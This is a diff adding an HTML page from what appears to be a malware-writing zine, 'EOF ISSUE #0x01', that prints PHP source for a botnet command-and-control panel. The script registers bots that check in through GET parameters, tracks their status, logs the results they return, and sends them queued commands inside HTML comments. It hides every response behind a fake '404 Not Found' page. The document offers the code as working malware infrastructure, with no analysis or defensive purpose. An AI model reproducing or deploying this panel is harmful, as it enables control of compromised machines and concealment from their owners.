@@ -1,0 +1,59 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: RadiatioN/EOF || <a style="text-decoration: none" href="../mainmenu/sources.htm"><span style="text-decoration: none">Back to sources</span></a> || <a style="text-decoration: none" target="_blank" href="../binsrc/RadiatioN/PHPCodeForHttpBot"><span style="text-decoration: none; color: #BFBF88">View project folder</span></a> || <hr></pre>
+<pre>&lt;?php
+include(&quot;./config.php&quot;);
+include(&quot;./functions.php&quot;);
+
+if(isset($_GET['hl']) &amp;&amp; isset($_GET['q']) &amp;&amp; isset($_GET['meta']))
+{
+	$hl = $_GET['hl'];
+	$q = $_GET['q'];
+	$meta = $_GET['meta'];
+
+	//check some general stuff
+	ConnectToDB($server, $user, $pw, $dbname);	
+	if(!IsBotInDB($hl, $q))
+	{
+		AddBotToDB($hl, $q, &quot;New&quot;);	
+	}
+	
+	if($meta==&quot;login&quot;)
+	{
+		UpdateBotStatus($hl, $q, &quot;Login&quot;, true);
+	}
+	else
+	{
+		UpdateBotStatus($hl, $q, &quot;Online&quot;, true);	
+	}
+	
+	UpdateBotStatusList($timeout, $hl, $q);
+	
+	//print out all commands for bot and delete them from queue as done
+	$botid = GetBotID($hl, $q);
+	
+	if(isset($_GET['res']) &amp;&amp; $_GET['res']!=&quot;&quot;)
+	{
+		AddResultToLog($q, $_GET['res']);
+	}
+	
+	echo(&quot;&lt;!--\n&quot;);
+	if($meta!=&quot;login&quot;)ShowAndDeleteCommandsForBot($botid);
+	echo(&quot;--&gt;\n&quot;);
+
+	CloseConnectionToDB();
+}
+
+echo('&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;' . &quot;\n&quot;);
+echo(&quot;&lt;HTML&gt;&lt;HEAD&gt;\n&quot;);
+echo(&quot;&lt;TITLE&gt;404 Not Found&lt;/TITLE&gt;\n&quot;);
+echo(&quot;&lt;/HEAD&gt;&lt;BODY&gt;\n&quot;);
+echo(&quot;&lt;H1&gt;Not Found&lt;/H1&gt;\n&quot;);
+echo(&quot;&lt;P&gt;The requested URL was not found on this server.&lt;/P&gt;\n&quot;);
+echo(&quot;&lt;HR&gt;\n&quot;);
+echo(&quot;&lt;/BODY&gt;&lt;/HTML&gt;\n&quot;);
+
+?&gt;
+</pre></body></html>
